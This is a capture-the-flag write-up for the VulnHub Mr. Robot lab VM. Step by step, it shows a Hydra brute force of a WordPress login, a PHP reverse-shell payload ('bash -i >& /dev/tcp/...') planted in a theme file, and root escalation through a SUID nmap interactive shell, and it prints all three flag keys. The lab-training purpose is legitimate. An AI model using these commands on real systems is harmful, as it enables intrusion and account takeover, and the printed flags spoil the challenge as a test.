# Mr-Robot-CTF
Hacking Exercise: in the style of Mr Robot

Mr. Robot-Inspired Hacking Exercise (CTF Write-Up)
🛠️ Setup
Downloads:
Kali Linux for VirtualBox: https://www.kali.org/get-kali/#kali-virtual-machines
Mr. Robot VM from VulnHub: https://www.vulnhub.com/entry/mr-robot-1,151/
VirtualBox Setup:
Add both Kali and Mr. Robot VMs to VirtualBox.
Create an internal network called "net" and assign both VMs to it.
Enable DHCP so Mr. Robot can get an IP:
bash
CopyEdit
VBoxManage dhcpserver add --network=net --server-ip=192.168.56.1 --lower-ip=192.168.56.100 --upper-ip=192.168.56.200 --netmask=255.255.255.0 --enable
Explanation:
--server-ip: Acts like the router IP.
--lower-ip / --upper-ip: IP range for devices on the network.
Boot up Kali:
User: kali
Password: kali
Check IP:
bash
CopyEdit
ip add show
Got IP: 192.168.56.100/24 ✅ No external internet access — as expected.

🔎 Scanning the Target
Boot up Mr. Robot VM — you’re met with a login screen. No creds. Time to investigate.
Use Nmap to scan the subnet:
bash
CopyEdit
sudo nmap -sS -T4 192.168.56.100-200
Flags Explained:
-sS: Stealth SYN scan. Sends SYN packets to check for open ports without completing the TCP handshake.
-T4: Aggressive timing — speeds up scanning. Great for internal networks like this, but can be noisy on real networks.

🌐 Web Recon
Found something at: http://192.168.56.101
Looks like a cool Mr. Robot-themed website, but no obvious way in yet.
Check for Hidden Directories
bash
CopyEdit
sudo dirb http://192.168.56.101
Found:
/robots.txt → Contains Key 1: 073403c8a58alf80d943455fb30724b9
Also found fsocity.dic → Likely a wordlist.

🔐 WordPress Login Enumeration
Try going to: http://192.168.56.101/wp-login.php
Tried “admin” / “admin” → “Invalid username” error suggests the system tells you when a username exists 👀
Time to enumerate usernames with Burp Suite Intruder.
Steps:
Intercept a login with username = test, password = test.
Send the request to Intruder.
Replace log=test with a payload position.
Load fsocity.dic as your wordlist.
Start attack.
✅ One result stands out — response is different for username Elliot. 🎯 We've found the correct username!

🔓 Brute Force the Password
Clean up the wordlist first:
bash
CopyEdit
sort fsocity.dic | uniq > fsocity2.txt
Now use Hydra:
bash
CopyEdit
sudo hydra -vV -l elliot -P fsocity2.txt 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' | tee -a hydra.txt
Flags:
-vV: Verbose output
-l: Set username
-P: Password list
http-post-form: Format for the attack
🎉 Password Found: ER28-0652 Login successful!

🐚 Reverse Shell (1st Attempt - Fail)
Tried adding a reverse shell to 404.php in WordPress Appearance > Theme Editor.
Payload:
php
CopyEdit
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/443 0>&1'");
?>
Set up Netcat listener:
bash
CopyEdit
sudo nc -lvp 443
Visited fake 404 URL → No connection 😕
Tried Metasploit:
bash
CopyEdit
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
Still didn’t work.

🐚 Reverse Shell (2nd Attempt - Success!)
Changed the IP and port in 404.php:
php
CopyEdit
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.100/4444 0>&1'");
?>
Set up Netcat:
bash
CopyEdit
sudo nc -nvlp 4444
Accessed a non-existent page like: http://192.168.56.101/idontexist
🎉 Connected!
Reverse Shell Explained:
bash
CopyEdit
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.100/4444 0>&1'
bash -i: Opens interactive shell
>& /dev/tcp/...: Redirects output to attacker's IP/port
0>&1: Redirects input from the same connection

🧠 Upgrade the Shell
bash
CopyEdit
python -c 'import pty; pty.spawn("/bin/bash")'
This gives us a more usable shell.

🔑 Key 2 and User Escalation
bash
CopyEdit
cd /home/robot
ls -al
Found:
key-2-of-3.txt
password.raw-md5
View the hash:
bash
CopyEdit
cat password.raw-md5
Hash: c3fcd3d76192e4007dfb496cca67e13b This is the MD5 of: abcdefghijklmnopqrstuvwxyz
Switch user:
bash
CopyEdit
su - robot
# password: abcdefghijklmnopqrstuvwxyz
✅ Now running as robot
Check sudo access:
bash
CopyEdit
sudo -l
❌ "Sorry, user robot may not run sudo on linux."
Get the second key:
bash
CopyEdit
cat key-2-of-3.txt
Key: 822c73956184f694993bede3eb39f959

🔍 Summary of Progress
✅ Key 1: 073403c8a58alf80d943455fb30724b9 ✅ Key 2: 822c73956184f694993bede3eb39f959 🔍 Current User: robot ❌ No sudo privileges (yet) 🔓 MD5 Cracked Password: abcdefghijklmnopqrstuvwxyz 💻 Reverse Shell success after tweaking the IP and port
 🚀 Privilege Escalation to Root (Key 3)
We’ve got two keys, a foothold on the box as user robot, but no sudo access. Time to escalate.

🔍 Step 1: Look for SUID Binaries
We're checking for binaries that have the SUID bit set — which lets users run a file with the permissions of the file owner (often root).
bash
CopyEdit
find / -user root -perm -4000 2>/dev/null
Explanation:
find /: Start from the root directory.
-user root: Only files owned by root.
-perm -4000: Look for the setuid permission.
2>/dev/null: Hide permission errors from inaccessible directories.
Result:
bash
CopyEdit
/usr/local/bin/nmap
... plus others like /bin/ping, /usr/bin/passwd, etc.
🚨 That copy of nmap stands out — it’s in /usr/local/bin, not the usual system path, which suggests it might be an older version. Let’s dig in.

🔍 Step 2: Investigating Nmap
bash
CopyEdit
/usr/local/bin/nmap --version
Output:
less
CopyEdit
nmap version 3.81 ( http://www.insecure.org/nmap/ )
Old version confirmed — v3.81 is known to be vulnerable, and this one is setuid root. Jackpot.

💣 Step 3: Exploiting Nmap (Interactive Mode FTW)
bash
CopyEdit
/usr/local/bin/nmap --interactive
Welcome to Interactive Mode. From here, we can run shell commands using !command.
Let’s test it:
bash
CopyEdit
nmap> !whoami
Result:
nginx
CopyEdit
root
Boom. Root access confirmed 🔥

🐚 Step 4: Spawn a Root Shell
To get a fully interactive shell:
bash
CopyEdit
nmap> !bash -p
The -p flag: Prevents bash from dropping root privileges by preserving the UID.
Now we’re in:
bash
CopyEdit
bash-4.3# whoami
root

🧭 Step 5: Finding the Final Key
Navigate to the root user's home directory:
bash
CopyEdit
cd /root
ls -al
We find:
.bash_history
key-3-of-3.txt 👀
Read the final key:
bash
CopyEdit
cat key-3-of-3.txt
✅ Key 3: 04787ddef27c3dee1ee161b21670b4e4

✅ Exercise Complete!
We captured all 3 flags:

